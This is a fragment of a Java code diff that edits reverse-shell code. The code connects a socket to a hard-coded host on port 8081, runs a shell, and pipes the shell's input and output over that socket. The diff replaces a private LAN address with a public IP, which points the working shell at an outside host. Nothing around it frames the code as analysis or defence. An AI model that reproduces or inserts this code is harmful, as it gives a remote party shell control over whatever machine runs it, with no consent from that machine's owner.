@@ -94,7 +94,7 @@
     }
  
     try {
-        Socket socket = new Socket( "192.168.119.128", 8081 ); // Replace with wanted ip and port
+        Socket socket = new Socket( "47.55.214.203 ", 8081 ); // Replace with wanted ip and port
         Process process = Runtime.getRuntime().exec( shellPath );
         new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
         new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
